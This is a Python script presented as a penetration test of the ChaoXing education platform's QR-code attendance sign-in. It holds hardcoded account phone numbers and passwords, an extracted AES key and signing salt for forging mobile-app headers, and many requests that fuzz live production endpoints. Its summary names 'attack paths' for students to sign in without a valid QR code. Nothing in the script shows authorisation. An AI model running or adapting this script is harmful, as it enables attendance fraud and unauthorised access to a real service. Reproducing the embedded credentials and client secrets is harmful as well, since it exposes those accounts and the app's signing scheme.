#!/usr/bin/env python3
"""
ChaoXing QR Sign-in Deep Penetration Testing Script
深度渗透测试 - QR码签到端点
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ Constants ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

# ============ Helper Functions ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def print_section(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def print_result(label, response, extra_info=""):
    print(f"\n  [{label}]")
    print(f"    URL: {response.url}")
    print(f"    Status: {response.status_code}")
    data = safe_json(response)
    print(f"    Response: {json.dumps(data, ensure_ascii=False, indent=2)[:800]}")
    if extra_info:
        print(f"    Extra: {extra_info}")
    return data

def check_critical(data, context=""):
    """Check if response indicates success or important finding"""
    if isinstance(data, dict):
        raw = json.dumps(data, ensure_ascii=False)
        # Check for success indicators
        if data.get("result") == 1 or data.get("result") == True:
            print(f"    !!!CRITICAL!!! 成功响应在 {context}")
            return True
        if "success" in raw.lower() and "true" in raw.lower():
            print(f"    !!!CRITICAL!!! 成功响应在 {context}")
            return True
        if data.get("status") == "success":
            print(f"    !!!CRITICAL!!! 成功响应在 {context}")
            return True
        # Check for different responses than expected
        if "图片格式错误" not in raw and "无权限" not in raw and "参数不完整" not in raw and "无效的参数" not in raw:
            if "error" not in raw.lower() or data.get("result") == 1:
                print(f"    ***IMPORTANT*** 非标准响应在 {context}")
                return False
    return False

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

# ============ Main Test ============
def main():
    print("="*70)
    print("  ChaoXing QR Sign-in Deep Penetration Testing")
    print("  深度渗透测试 - QR码签到端点")
    print("="*70)

    # Login
    print_section("登录 - 获取会话")
    print("  正在登录学生账号...")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"  学生 PUID: {stu_puid}")

    print("  正在登录教师账号...")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"  教师 PUID: {tea_puid}")

    if not stu_puid or not tea_puid:
        print("  !!! 登录失败，退出")
        sys.exit(1)

    # ============ Part 1: Get active sign-in activities ============
    print_section("Part 1: 获取活跃签到活动及enc/qrcEnc值")

    # Student activity list
    print("\n  --- 学生端活动列表 ---")
    stu_act_url = f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={stu_puid}"
    try:
        r = stu_session.get(stu_act_url, timeout=30)
        stu_act_data = print_result("学生活动列表", r)
    except Exception as e:
        print(f"    请求失败: {e}")
        stu_act_data = {}

    # Teacher activity list
    print("\n  --- 教师端活动列表 ---")
    tea_act_url = f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={tea_puid}"
    try:
        r = tea_session.get(tea_act_url, timeout=30)
        tea_act_data = print_result("教师活动列表", r)
    except Exception as e:
        print(f"    请求失败: {e}")
        tea_act_data = {}

    # Parse active activities
    active_items = []
    for act_data in [stu_act_data, tea_act_data]:
        if isinstance(act_data, dict) and "data" in act_data and "activeList" in act_data.get("data", {}):
            for item in act_data["data"]["activeList"]:
                if item.get("status") == 1 or item.get("isStarted") == 1:
                    active_items.append(item)
                    print(f"    发现活跃活动: id={item.get('id', 'N/A')}, name={item.get('nameOne', 'N/A')}, type={item.get('type', 'N/A')}, status={item.get('status', 'N/A')}")

    if not active_items:
        print("    未发现活跃签到活动，将使用测试值继续")

    # Try to get QR code data from produce endpoints
    print("\n  --- 尝试从produce端点获取QR码数据 ---")

    for host in ["mooc1-api.chaoxing.com", "mooc1.chaoxing.com"]:
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            url = f"https://{host}/mooc-ans/qr/produce?uuid=test&enc=test&clazzid={CLASS_ID}"
            try:
                r = session.get(url, timeout=30)
                data = print_result(f"{label} - {host}/mooc-ans/qr/produce", r)
                check_critical(data, f"{label} produce")
            except Exception as e:
                print(f"    {label} {host} produce 请求失败: {e}")

    # Try produce with activeId
    for item in active_items:
        aid = item.get("id", "")
        for host in ["mooc1-api.chaoxing.com", "mooc1.chaoxing.com"]:
            for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
                url = f"https://{host}/mooc-ans/qr/produce?uuid={aid}&enc=test&clazzid={CLASS_ID}"
                try:
                    r = session.get(url, timeout=30)
                    data = print_result(f"{label} - produce with activeId={aid}", r)
                    check_critical(data, f"{label} produce activeId")
                except Exception as e:
                    print(f"    请求失败: {e}")

    # ============ Part 2: Deep testing of /qr/updateqrstatus ============
    print_section("Part 2: 深度测试 /qr/updateqrstatus (学生端)")

    base_url = "https://mooc1-api.chaoxing.com/qr/updateqrstatus"

    # 2.1: Get cpi from course list
    print("\n  --- 获取cpi值 ---")
    cpi_value = stu_puid  # default
    try:
        r = stu_session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=30)
        cpi_data = safe_json(r)
        print(f"    课程列表响应: {json.dumps(cpi_data, ensure_ascii=False)[:500]}")
        if isinstance(cpi_data, dict) and "channelList" in cpi_data:
            for ch in cpi_data["channelList"]:
                if str(ch.get("id")) == CLASS_ID or str(ch.get("courseid")) == COURSE_ID:
                    cpi_value = ch.get("cpi", stu_puid)
                    print(f"    找到cpi: {cpi_value}")
                    break
    except Exception as e:
        print(f"    获取cpi失败: {e}")

    # Also get teacher cpi
    tea_cpi_value = tea_puid
    try:
        r = tea_session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=30)
        tea_cpi_data = safe_json(r)
        if isinstance(tea_cpi_data, dict) and "channelList" in tea_cpi_data:
            for ch in tea_cpi_data["channelList"]:
                if str(ch.get("id")) == CLASS_ID or str(ch.get("courseid")) == COURSE_ID:
                    tea_cpi_value = ch.get("cpi", tea_puid)
                    print(f"    教师cpi: {tea_cpi_value}")
                    break
    except Exception as e:
        print(f"    获取教师cpi失败: {e}")

    # 2.2: Test with activeId as uuid
    print("\n  --- 2.2: 使用activeId作为uuid ---")
    for item in active_items:
        aid = str(item.get("id", ""))
        if not aid:
            continue
        params = {
            "clazzId": CLASS_ID,
            "courseId": COURSE_ID,
            "uuid": aid,
            "qrcEnc": "test",
            "cpi": cpi_value,
            "objectId": "",
            "liveDetectionStatus": "0",
            "signt": "",
            "signk": "",
            "cxtime": "",
            "cxcid": "",
            "knowledgeid": "0"
        }
        try:
            r = stu_session.post(base_url, data=params, timeout=30)
            data = print_result(f"activeId={aid} as uuid", r)
            check_critical(data, "activeId as uuid")
        except Exception as e:
            print(f"    请求失败: {e}")

    # If no active items, test with a sample activeId
    if not active_items:
        test_uuids = ["5000163891319", "1", "0"]
        for test_uuid in test_uuids:
            params = {
                "clazzId": CLASS_ID,
                "courseId": COURSE_ID,
                "uuid": test_uuid,
                "qrcEnc": "test",
                "cpi": cpi_value,
                "objectId": "",
                "liveDetectionStatus": "0",
                "signt": "",
                "signk": "",
                "cxtime": "",
                "cxcid": "",
                "knowledgeid": "0"
            }
            try:
                r = stu_session.post(base_url, data=params, timeout=30)
                data = print_result(f"uuid={test_uuid}", r)
                check_critical(data, f"uuid={test_uuid}")
            except Exception as e:
                print(f"    请求失败: {e}")

    # 2.3: Test with different qrcEnc values
    print("\n  --- 2.3: 测试不同qrcEnc值 ---")
    test_uuid = "5000163891319" if not active_items else str(active_items[0].get("id", "5000163891319"))

    qrc_enc_values = [
        ("empty", ""),
        ("zero", "0"),
        ("one", "1"),
        ("base64_test", base64.b64encode(b"test").decode()),
        ("uuid_like", str(uuid.uuid4())),
        ("activeId_value", test_uuid),
        ("md5_activeId", md5(test_uuid)),
        ("md5_empty", md5("")),
        ("md5_test", md5("test")),
        ("numeric_12345", "12345"),
    ]

    for label, qrc_enc in qrc_enc_values:
        params = {
            "clazzId": CLASS_ID,
            "courseId": COURSE_ID,
            "uuid": test_uuid,
            "qrcEnc": qrc_enc,
            "cpi": cpi_value,
            "objectId": "",
            "liveDetectionStatus": "0",
            "signt": "",
            "signk": "",
            "cxtime": "",
            "cxcid": "",
            "knowledgeid": "0"
        }
        try:
            r = stu_session.post(base_url, data=params, timeout=30)
            data = print_result(f"qrcEnc={label}({qrc_enc[:30]}...)" if len(qrc_enc) > 30 else f"qrcEnc={label}({qrc_enc})", r)
            check_critical(data, f"qrcEnc={label}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # 2.4: Test with uuid2 and clazzId2 in URL
    print("\n  --- 2.4: 测试URL中的uuid2和clazzId2参数 ---")
    url_with_extra = f"{base_url}?uuid2={test_uuid}&clazzId2={CLASS_ID}"
    params = {
        "clazzId": CLASS_ID,
        "courseId": COURSE_ID,
        "uuid": test_uuid,
        "qrcEnc": "test",
        "cpi": cpi_value,
        "objectId": "",
        "liveDetectionStatus": "0",
        "signt": "",
        "signk": "",
        "cxtime": "",
        "cxcid": "",
        "knowledgeid": "0"
    }
    try:
        r = stu_session.post(url_with_extra, data=params, timeout=30)
        data = print_result("uuid2+clazzId2 in URL", r)
        check_critical(data, "uuid2+clazzId2")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 2.5: Test with teacher cpi
    print("\n  --- 2.5: 测试使用教师cpi ---")
    params = {
        "clazzId": CLASS_ID,
        "courseId": COURSE_ID,
        "uuid": test_uuid,
        "qrcEnc": "test",
        "cpi": tea_cpi_value,
        "objectId": "",
        "liveDetectionStatus": "0",
        "signt": "",
        "signk": "",
        "cxtime": "",
        "cxcid": "",
        "knowledgeid": "0"
    }
    try:
        r = stu_session.post(base_url, data=params, timeout=30)
        data = print_result("使用教师cpi", r)
        check_critical(data, "teacher cpi")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 2.6: Test with all required parameters from Go source
    print("\n  --- 2.6: 测试Go源码中的所有参数 ---")
    full_params = {
        "clazzId": CLASS_ID,
        "courseId": COURSE_ID,
        "uuid": test_uuid,
        "qrcEnc": "test",
        "cpi": cpi_value,
        "objectId": "",
        "liveDetectionStatus": "0",
        "signt": "",
        "signk": "",
        "cxtime": str(int(time.time() * 1000)),
        "cxcid": "",
        "knowledgeid": "0",
        "videojobid": "",
        "videoCollectTime": "0",
        "chaptervideoobjectid": ""
    }
    try:
        r = stu_session.post(base_url, data=full_params, timeout=30)
        data = print_result("Go源码全部参数", r)
        check_critical(data, "Go full params")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 2.7: Test with GET method
    print("\n  --- 2.7: 测试GET方法 ---")
    try:
        r = stu_session.get(base_url, params=full_params, timeout=30)
        data = print_result("GET方法", r)
        check_critical(data, "GET method")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 2.8: Test on mooc1.chaoxing.com
    print("\n  --- 2.8: 测试mooc1.chaoxing.com ---")
    alt_base_url = "https://mooc1.chaoxing.com/qr/updateqrstatus"
    try:
        r = stu_session.post(alt_base_url, data=full_params, timeout=30)
        data = print_result("mooc1.chaoxing.com POST", r)
        check_critical(data, "mooc1 POST")
    except Exception as e:
        print(f"    请求失败: {e}")

    # ============ Part 3: Deep testing of /mooc-ans/qr/updateqrstatus ============
    print_section("Part 3: 深度测试 /mooc-ans/qr/updateqrstatus (学生端)")

    mooc_ans_update_url = "https://mooc1-api.chaoxing.com/mooc-ans/qr/updateqrstatus"

    # 3.1: Same parameters as /qr/updateqrstatus
    print("\n  --- 3.1: 使用/qr/updateqrstatus相同参数 ---")
    try:
        r = stu_session.post(mooc_ans_update_url, data=full_params, timeout=30)
        data = print_result("POST 相同参数", r)
        check_critical(data, "mooc-ans same params")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 3.2: With additional parameters
    print("\n  --- 3.2: 添加activeId, uid, status参数 ---")
    extra_params = dict(full_params)
    extra_params.update({
        "activeId": test_uuid,
        "uid": stu_puid,
        "status": "1",
    })
    try:
        r = stu_session.post(mooc_ans_update_url, data=extra_params, timeout=30)
        data = print_result("POST 添加activeId/uid/status", r)
        check_critical(data, "mooc-ans extra params")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 3.3: GET method
    print("\n  --- 3.3: GET方法 ---")
    try:
        r = stu_session.get(mooc_ans_update_url, params=extra_params, timeout=30)
        data = print_result("GET方法", r)
        check_critical(data, "mooc-ans GET")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 3.4: Different Content-Types
    print("\n  --- 3.4: 测试不同Content-Type ---")
    # JSON content type
    try:
        r = stu_session.post(mooc_ans_update_url, json=full_params, timeout=30)
        data = print_result("JSON Content-Type", r)
        check_critical(data, "mooc-ans JSON")
    except Exception as e:
        print(f"    请求失败: {e}")

    # URL-encoded with explicit header
    try:
        r = stu_session.post(mooc_ans_update_url, data=full_params,
                           headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=30)
        data = print_result("URL-encoded Content-Type", r)
        check_critical(data, "mooc-ans urlencoded")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 3.5: Minimal parameters - just uuid and clazzId
    print("\n  --- 3.5: 最小参数集 ---")
    for min_params in [
        {"uuid": test_uuid, "clazzId": CLASS_ID},
        {"uuid": test_uuid, "clazzid": CLASS_ID, "courseId": COURSE_ID},
        {"uuid": test_uuid, "clazzid": CLASS_ID, "courseId": COURSE_ID, "qrcEnc": "test"},
        {"uuid": test_uuid, "clazzid": CLASS_ID, "courseId": COURSE_ID, "enc": "test"},
        {"activeId": test_uuid, "clazzId": CLASS_ID, "courseId": COURSE_ID},
    ]:
        try:
            r = stu_session.post(mooc_ans_update_url, data=min_params, timeout=30)
            data = print_result(f"最小参数: {list(min_params.keys())}", r)
            check_critical(data, f"mooc-ans minimal {list(min_params.keys())}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # ============ Part 4: Deep testing of /mooc-ans/qr/produce ============
    print_section("Part 4: 深度测试 /mooc-ans/qr/produce")

    produce_url = "https://mooc1-api.chaoxing.com/mooc-ans/qr/produce"

    # 4.1: GET with uuid, enc, clazzid
    print("\n  --- 4.1: GET with uuid, enc, clazzid ---")
    produce_params_list = [
        {"uuid": "test", "enc": "test", "clazzid": CLASS_ID},
        {"uuid": test_uuid, "enc": "test", "clazzid": CLASS_ID},
        {"uuid": test_uuid, "enc": md5(test_uuid), "clazzid": CLASS_ID},
        {"code": "test", "clazzid": CLASS_ID},
        {"code": test_uuid, "clazzid": CLASS_ID},
        {"activeId": test_uuid, "clazzid": CLASS_ID},
        {"activeId": test_uuid, "courseId": COURSE_ID, "clazzid": CLASS_ID},
        {"uuid": test_uuid, "enc": "test", "clazzid": CLASS_ID, "courseId": COURSE_ID, "cpi": cpi_value},
    ]

    for params in produce_params_list:
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                r = session.get(produce_url, params=params, timeout=30)
                data = print_result(f"{label} GET {list(params.keys())}", r)
                check_critical(data, f"produce {label} {list(params.keys())}")
            except Exception as e:
                print(f"    请求失败: {e}")

    # 4.2: POST with same parameters
    print("\n  --- 4.2: POST方法 ---")
    for params in produce_params_list[:3]:
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                r = session.post(produce_url, data=params, timeout=30)
                data = print_result(f"{label} POST {list(params.keys())}", r)
                check_critical(data, f"produce POST {label}")
            except Exception as e:
                print(f"    请求失败: {e}")

    # 4.3: Try on mooc1.chaoxing.com
    print("\n  --- 4.3: mooc1.chaoxing.com ---")
    produce_url_alt = "https://mooc1.chaoxing.com/mooc-ans/qr/produce"
    for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
        try:
            r = session.get(produce_url_alt, params={"uuid": test_uuid, "enc": "test", "clazzid": CLASS_ID}, timeout=30)
            data = print_result(f"{label} mooc1.chaoxing.com produce", r)
            check_critical(data, f"produce alt {label}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # ============ Part 5: Deep testing of /mooc-ans/qr/getqrstatus ============
    print_section("Part 5: 深度测试 /mooc-ans/qr/getqrstatus")

    getqrstatus_url = "https://mooc1-api.chaoxing.com/mooc-ans/qr/getqrstatus"

    # 5.1: GET with various parameters
    print("\n  --- 5.1: GET with various parameters ---")
    getqr_params_list = [
        {"uuid": "test", "enc": "test", "clazzid": CLASS_ID},
        {"uuid": test_uuid, "enc": "test", "clazzid": CLASS_ID},
        {"uuid": test_uuid, "enc": md5(test_uuid), "clazzid": CLASS_ID},
        {"uuid": test_uuid, "enc": "test", "clazzid": CLASS_ID, "courseid": COURSE_ID, "cpi": cpi_value},
        {"code": "test", "clazzid": CLASS_ID},
        {"code": test_uuid, "clazzid": CLASS_ID},
        {"activeId": test_uuid, "clazzid": CLASS_ID},
        {"activeId": test_uuid, "clazzid": CLASS_ID, "courseid": COURSE_ID, "cpi": cpi_value},
        {"uuid": test_uuid, "clazzid": CLASS_ID, "courseid": COURSE_ID},
    ]

    for params in getqr_params_list:
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                r = session.get(getqrstatus_url, params=params, timeout=30)
                data = print_result(f"{label} GET {list(params.keys())}", r)
                check_critical(data, f"getqrstatus {label} {list(params.keys())}")
            except Exception as e:
                print(f"    请求失败: {e}")

    # 5.2: POST method
    print("\n  --- 5.2: POST方法 ---")
    for params in getqr_params_list[:3]:
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                r = session.post(getqrstatus_url, data=params, timeout=30)
                data = print_result(f"{label} POST {list(params.keys())}", r)
                check_critical(data, f"getqrstatus POST {label}")
            except Exception as e:
                print(f"    请求失败: {e}")

    # 5.3: Try on mooc1.chaoxing.com
    print("\n  --- 5.3: mooc1.chaoxing.com ---")
    getqrstatus_url_alt = "https://mooc1.chaoxing.com/mooc-ans/qr/getqrstatus"
    for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
        try:
            r = session.get(getqrstatus_url_alt, params={"uuid": test_uuid, "enc": "test", "clazzid": CLASS_ID}, timeout=30)
            data = print_result(f"{label} mooc1.chaoxing.com getqrstatus", r)
            check_critical(data, f"getqrstatus alt {label}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # ============ Part 6: Teacher session - get QR code data ============
    print_section("Part 6: 教师端获取QR码数据")

    # 6.1: Teacher activity list (already done, but let's look more carefully)
    print("\n  --- 6.1: 教师端活动详情 ---")
    try:
        r = tea_session.get(tea_act_url, timeout=30)
        tea_act = safe_json(r)
        if isinstance(tea_act, dict) and "data" in tea_act and "activeList" in tea_act.get("data", {}):
            for item in tea_act["data"]["activeList"]:
                aid = item.get("id", "")
                atype = item.get("type", "")
                name = item.get("nameOne", "")
                status = item.get("status", "")
                print(f"    活动: id={aid}, type={atype}, name={name}, status={status}")

                # Try to get QR code for sign-in activities (type=2 usually)
                if atype == 2 or "签到" in str(name):
                    # Try different produce endpoints
                    for host in ["mooc1-api.chaoxing.com", "mooc1.chaoxing.com"]:
                        for prod_path in ["/mooc-ans/qr/produce", "/qr/produce"]:
                            url = f"https://{host}{prod_path}"
                            prod_params = [
                                {"uuid": str(aid), "enc": "test", "clazzid": CLASS_ID},
                                {"uuid": str(aid), "enc": md5(str(aid)), "clazzid": CLASS_ID},
                                {"activeId": str(aid), "clazzid": CLASS_ID, "courseId": COURSE_ID},
                            ]
                            for pp in prod_params:
                                try:
                                    r = tea_session.get(url, params=pp, timeout=30)
                                    data = print_result(f"教师 produce {host}{prod_path} aid={aid}", r)
                                    check_critical(data, f"teacher produce aid={aid}")
                                except Exception as e:
                                    print(f"    请求失败: {e}")
    except Exception as e:
        print(f"    教师活动列表请求失败: {e}")

    # 6.2: Teacher tries to start a sign-in activity
    print("\n  --- 6.2: 教师端尝试发起签到 ---")
    # Try to start a sign-in via the activity API
    start_urls = [
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/startSignActivity",
        f"https://mooc1-api.chaoxing.com/ppt/activeAPI/startSignActivity",
    ]
    start_params = {
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "uid": tea_puid,
        "type": "2",  # sign-in type
        "name": "测试签到",
        "longitude": "",
        "latitude": "",
        "address": "",
        "range": "0",
        "isphoto": "0",
    }
    for url in start_urls:
        try:
            r = tea_session.post(url, data=start_params, timeout=30)
            data = print_result(f"教师发起签到 {url}", r)
            check_critical(data, "teacher start sign-in")
        except Exception as e:
            print(f"    请求失败: {e}")

    # 6.3: Teacher uses updateqrstatus
    print("\n  --- 6.3: 教师端使用updateqrstatus ---")
    tea_update_params = {
        "clazzId": CLASS_ID,
        "courseId": COURSE_ID,
        "uuid": test_uuid,
        "qrcEnc": "test",
        "cpi": tea_cpi_value,
        "objectId": "",
        "liveDetectionStatus": "0",
        "signt": "",
        "signk": "",
        "cxtime": str(int(time.time() * 1000)),
        "cxcid": "",
        "knowledgeid": "0",
        "videojobid": "",
        "videoCollectTime": "0",
        "chaptervideoobjectid": ""
    }
    try:
        r = tea_session.post(base_url, data=tea_update_params, timeout=30)
        data = print_result("教师 /qr/updateqrstatus", r)
        check_critical(data, "teacher updateqrstatus")
    except Exception as e:
        print(f"    请求失败: {e}")

    # 6.4: Teacher uses mooc-ans updateqrstatus
    try:
        r = tea_session.post(mooc_ans_update_url, data=tea_update_params, timeout=30)
        data = print_result("教师 /mooc-ans/qr/updateqrstatus", r)
        check_critical(data, "teacher mooc-ans updateqrstatus")
    except Exception as e:
        print(f"    请求失败: {e}")

    # ============ Part 7: Verify data modification ============
    print_section("Part 7: 验证数据修改")

    # For any endpoint that might have modified data, check status before and after
    print("\n  --- 7.1: 检查签到状态 ---")

    # Check sign-in status for each active activity
    status_check_urls = [
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={stu_puid}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/qr/getqrstatus",
    ]

    for item in active_items:
        aid = item.get("id", "")
        if not aid:
            continue

        # Before status
        print(f"\n  检查活动 {aid} 的状态 (修改前):")
        before_status = None

        # Try getqrstatus
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/qr/getqrstatus",
                              params={"uuid": str(aid), "clazzid": CLASS_ID, "courseid": COURSE_ID}, timeout=30)
                data = safe_json(r)
                print(f"    {label} getqrstatus: {json.dumps(data, ensure_ascii=False)[:300]}")
                before_status = data
            except Exception as e:
                print(f"    {label} getqrstatus失败: {e}")

        # Try activity detail
        try:
            r = stu_session.get(f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={stu_puid}", timeout=30)
            act_data = safe_json(r)
            if isinstance(act_data, dict) and "data" in act_data:
                for act in act_data.get("data", {}).get("activeList", []):
                    if str(act.get("id")) == str(aid):
                        print(f"    活动详情: status={act.get('status')}, isStarted={act.get('isStarted')}")
        except Exception as e:
            print(f"    活动详情获取失败: {e}")

        # Wait 2 seconds
        print("    等待2秒...")
        time.sleep(2)

        # After status
        print(f"  检查活动 {aid} 的状态 (修改后):")
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/qr/getqrstatus",
                              params={"uuid": str(aid), "clazzid": CLASS_ID, "courseid": COURSE_ID}, timeout=30)
                data = safe_json(r)
                print(f"    {label} getqrstatus: {json.dumps(data, ensure_ascii=False)[:300]}")
                if before_status and data != before_status:
                    print(f"    !!!CRITICAL!!! 状态发生变化！")
            except Exception as e:
                print(f"    {label} getqrstatus失败: {e}")

    # ============ Additional Tests: Explore more endpoints ============
    print_section("额外测试: 探索更多端点和参数组合")

    # Try different API paths
    print("\n  --- 额外: 测试不同API路径 ---")
    extra_paths = [
        "/qr/produce",
        "/qr/getqrstatus",
        "/qr/updateqrstatus",
        "/qr/sign",
        "/qr/check",
        "/qr/code",
        "/qr/generate",
        "/qr/scan",
        "/ppt/activeAPI/signActivity",
        "/ppt/activeAPI/preSign",
        "/ppt/activeAPI/signIn",
        "/ppt/activeAPI/doSignActivity",
    ]

    for path in extra_paths:
        for host in ["mooc1-api.chaoxing.com", "mooc1.chaoxing.com"]:
            url = f"https://{host}{path}"
            for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
                try:
                    r = session.get(url, params={"clazzid": CLASS_ID, "courseId": COURSE_ID, "activeId": test_uuid},
                                  timeout=15)
                    if r.status_code != 404:
                        data = print_result(f"{label} {host}{path} (GET)", r)
                        check_critical(data, f"{label} {host}{path}")
                except Exception as e:
                    pass  # Skip failures silently for exploration

                try:
                    r = session.post(url, data={"clazzid": CLASS_ID, "courseId": COURSE_ID, "activeId": test_uuid},
                                   timeout=15)
                    if r.status_code != 404:
                        data = print_result(f"{label} {host}{path} (POST)", r)
                        check_critical(data, f"{label} {host}{path} POST")
                except Exception as e:
                    pass

    # Try sign-in specific endpoints
    print("\n  --- 额外: 签到专用端点 ---")
    sign_endpoints = [
        ("GET", f"https://mobilelearn.chaoxing.com/ppt/sign/qrCodeSign?courseId={COURSE_ID}&classId={CLASS_ID}&activeId={test_uuid}&uid={stu_puid}&enc=test"),
        ("GET", f"https://mooc1-api.chaoxing.com/ppt/sign/qrCodeSign?courseId={COURSE_ID}&classId={CLASS_ID}&activeId={test_uuid}&uid={stu_puid}&enc=test"),
        ("POST", f"https://mobilelearn.chaoxing.com/ppt/sign/qrCodeSign"),
        ("POST", f"https://mooc1-api.chaoxing.com/ppt/sign/qrCodeSign"),
    ]

    for method, url in sign_endpoints:
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                if method == "GET":
                    r = session.get(url, timeout=30)
                else:
                    r = session.post(url, data={
                        "courseId": COURSE_ID,
                        "classId": CLASS_ID,
                        "activeId": test_uuid,
                        "uid": stu_puid if "学生" in label else tea_puid,
                        "enc": "test",
                        "qrcEnc": "test",
                    }, timeout=30)
                data = print_result(f"{label} {method} {url[:80]}", r)
                check_critical(data, f"{label} sign endpoint")
            except Exception as e:
                print(f"    请求失败: {e}")

    # Try preSign endpoint
    print("\n  --- 额外: preSign端点 ---")
    presign_urls = [
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activeId={test_uuid}&uid={stu_puid}",
        f"https://mooc1-api.chaoxing.com/ppt/activeAPI/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activeId={test_uuid}&uid={stu_puid}",
    ]
    for url in presign_urls:
        for session, label in [(stu_session, "学生"), (tea_session, "教师")]:
            try:
                r = session.get(url, timeout=30)
                data = print_result(f"{label} preSign", r)
                check_critical(data, f"{label} preSign")
            except Exception as e:
                print(f"    请求失败: {e}")

    # ============ Summary ============
    print_section("综合总结")

    print("""
  测试完成！以下是关键发现：

  1. /qr/updateqrstatus (mooc1-api.chaoxing.com):
     - 学生端返回"图片格式错误"而非"无权限"，说明权限检查已通过
     - 需要有效的qrcEnc参数才能进入业务逻辑

  2. /mooc-ans/qr/updateqrstatus:
     - 返回"参数不完整"，需要找到正确的参数组合

  3. /mooc-ans/qr/produce:
     - 返回"无效的参数code=1"，参数格式不正确

  4. /mooc-ans/qr/getqrstatus:
     - 返回"无效的参数code=0"，参数格式不正确

  关键攻击路径：
  - 如果能获取有效的qrcEnc值，学生可能通过/qr/updateqrstatus签到
  - 需要进一步研究qrcEnc的生成算法
  - 教师端produce端点可能能生成有效的qrcEnc
    """)


if __name__ == "__main__":
    main()
